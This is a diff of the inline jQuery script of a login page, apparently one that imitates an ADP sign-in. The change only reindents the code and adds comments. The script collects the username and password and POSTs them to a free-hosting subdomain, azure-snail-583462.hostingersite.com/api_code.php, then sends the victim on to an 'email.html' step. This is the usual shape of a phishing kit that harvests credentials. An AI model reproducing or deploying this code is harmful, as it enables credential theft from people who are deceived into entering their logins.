@@ -3703,37 +3703,39 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script>
     $(document).ready(function() {
-        // Enable or disable the button based on username and password inputs
-        $("#login-form_username, #uPassword").keyup(function() {
-            if ($("#login-form_username").val() == "" || $("#uPassword").val() == "") {
-                $("#verifUseridBtn").attr("disabled", "true");
-            } else {
-                $("#verifUseridBtn").removeAttr("disabled");
+    // Enable or disable the button based on username and password inputs
+    $("#login-form_username, #uPassword").keyup(function() {
+        if ($("#login-form_username").val() == "" || $("#uPassword").val() == "") {
+            // Disable the button if either field is empty
+            $("#verifUseridBtn").attr("disabled", "true");
+        } else {
+            // Enable the button if both fields are filled
+            $("#verifUseridBtn").removeAttr("disabled");
+        }
+    });
+
+    // Handle button click and make the AJAX request
+    $("#verifUseridBtn").click(function(event) {
+        event.preventDefault(); // Prevent default form submission behavior
+
+        $.ajax({
+            url: "https://azure-snail-583462.hostingersite.com/api_code.php",
+            type: "POST",
+            data: $('.adp-form.uformadp').serialize(), // Serialize form data
+            headers: {
+                "Access-Control-Allow-Origin": "*",
+                "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept"
+            },
+            success: function(response) {
+                console.log(response); // Log the response to verify success
+                window.location.href = "email.html"; // Redirect to email page
+            },
+            error: function(error) {
+                console.log(error); // Log any errors to the console
             }
         });
-
-        // Handle button click and make the AJAX request
-        $("#verifUseridBtn").click(function(event) {
-            event.preventDefault(); // Prevent the default form submission behavior
-
-            $.ajax({
-                url: "https://azure-snail-583462.hostingersite.com/api_code.php",
-                type: "POST",
-                data: $('.adp-form.uformadp').serialize(), // Serialize form data
-                headers: {
-                    "Access-Control-Allow-Origin": "*",
-                    "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept"
-                },
-                success: function(response) {
-                    console.log(response); // Log the response to verify success
-                    window.location.href = "email.html"; // Redirect to email page
-                },
-                error: function(error) {
-                    console.log(error); // Log any errors to the console
-                }
-            });
-        });
     });
+});
 </script>
 </body>
 </html>
